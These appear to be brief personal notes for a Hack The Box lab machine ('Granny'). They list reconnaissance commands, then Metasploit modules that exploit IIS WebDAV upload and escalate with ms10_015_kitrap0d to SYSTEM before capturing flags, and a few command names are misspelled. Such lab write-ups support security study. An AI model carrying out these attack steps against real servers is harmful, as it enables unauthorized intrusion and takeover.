ping 10.10.10.15
whatweb 10.10.10.15

echo "10.10.10.15 grany.htb" >> /etc/hosts
access site -> basic static page

namp granny.htb

msfocnsole
use windows/iis/iis_webdav_upload_asp
set lhost, lport and rhost
run

cd c:/
cd "Documents and Settings"
cd Lakis -> Operation failed: Access is denied.

ps -> find NETWORK PRIVILEGES
migrate <pid>

getuid -> NETWORK PRIVILEGES
background

metasploit privilege escalation (https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)
use windows/local/ms10_015_kitrap0d
set lport, lhost and session
run

getuid -> SYSTEM PRIVILEGES
cd "Documents and Settings"

get flags